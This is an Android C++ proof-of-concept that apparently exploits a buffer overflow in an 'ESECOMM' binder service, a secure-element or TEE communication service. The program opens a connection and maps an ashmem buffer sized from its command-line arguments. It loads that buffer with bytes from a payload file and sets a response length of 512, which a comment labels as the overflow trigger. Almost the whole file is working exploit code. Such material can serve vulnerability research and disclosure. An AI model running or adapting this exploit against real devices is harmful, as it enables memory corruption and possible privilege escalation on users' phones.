#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <utils/Log.h>
#include <binder/IPCThreadState.h>
#include <cutils/ashmem.h>

#include <binder/ProcessState.h>
#include <binder/IServiceManager.h>
#include <binder/MemoryDealer.h>

#include <sys/time.h>

namespace android{

// get the name of the generic interface we hold a reference to
static String16 get_interface_name(sp<IBinder> service)
{
    if (service != NULL) {
        Parcel data, reply;
        status_t err = service->transact(IBinder::INTERFACE_TRANSACTION, data, &reply);
        if (err == NO_ERROR) {
            return reply.readString16();
        }
    }
    return String16();
}

struct Tee {
  public:

    Tee();
    int doExp(int sendlen_, char *filename);

    status_t initCheck() const;

  private:

        status_t mInitCheck;
        status_t initTEE();

        sp<IBinder> mBinder;
	String16 mIfName;

  protected:
        virtual ~Tee(){};
};

Tee::Tee()
    : mInitCheck(NO_INIT) {
    mInitCheck = initTEE();
}

status_t Tee::initCheck() const {
    return mInitCheck;
}

status_t Tee::initTEE() {
    sp<IServiceManager> sm = defaultServiceManager();
    mBinder = sm->checkService(String16("ESECOMM"));
    mIfName = get_interface_name(mBinder);
 
    return OK; //NO_INIT;
}

int Tee::doExp(int sendlen_, char *filename){

    Parcel data1, data, reply;
    uint32_t code;
    uint32_t sendlen = sendlen_;
    if (sendlen == 0){
        sendlen = 4416;
    }
    uint32_t recvlen = 4416; //BOF if sendlen is 512
    int fd;
    uint8_t *shm;
    uint8_t *shm_payload;
    uint8_t *shm_resp;
    char *name = (char *) "ashmem";
    status_t st;

    //first, we have to open the connection

    code = 0; //OPENSWCONN
    st = data1.writeInterfaceToken(mIfName);
    printf("writeInterfaceToken: %d\n", st);
    mBinder->transact(code, data1, &reply, 1);
    printf("transact finished: %s\n",String8(reply.readString16()).string());

    //second, we have to send the ASHMEM command
  
    code = 3;

    fd = ashmem_create_region(name, sendlen+recvlen);
    printf("ashmem fd: %d\n", fd);
    ashmem_pin_region(fd, 0, 0);

    shm = (uint8_t *) mmap(NULL, sendlen+recvlen, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    memset(shm, 0x00, sendlen);

    int pfd;
    if (filename == NULL){
        pfd = open("./apdu.bin", O_RDONLY);
    }
    else{
        pfd = open(filename, O_RDONLY);
    }

    int read_bytes;
    printf("pfd = %d\n", pfd);
    read_bytes = read(pfd, shm, sendlen);
    printf("read_bytes = %d\n", read_bytes);
    close(pfd);

    if ((uint32_t)read_bytes > sendlen){
        printf("read_bytes wrong!\n");
	return -1;
    }

    //respmsg->total_len: 0x200 (512)
    shm_resp = shm + sendlen;
    shm_resp[4] = 0x00;
    shm_resp[5] = 0x02;

    printf("shm created: %p\n", shm);
    st = data.writeInterfaceToken(mIfName);
    printf("writeInterfaceToken: %d\n", st);
    st = data.writeInt32(recvlen);
    printf("writeInt32: %d\n", st);
    st = data.writeInt32(sendlen);
    printf("writeInt32: %d\n", st);
    //now we have to write a filedescriptor for mmap'ed buffer.
    st = data.writeFileDescriptor(fd, 0);
    printf("writeFileDescriptor: %d\n", st);

    mBinder->transact(code, data, &reply, 1); 
    printf("transact finished: %s\n",String8(reply.readString16()).string());

    return 0;
}

}
using namespace android;
int main(int argc, char **argv){
    int sendlen = 0;
    char *apdu_filename = NULL;
    if (argc > 1){
        sendlen = atoi(argv[1]);
    }
    if (argc > 2){
        apdu_filename = argv[2];
    }

    Tee* teezer = new Tee();
    teezer->doExp(sendlen, apdu_filename);
    return 0;
}
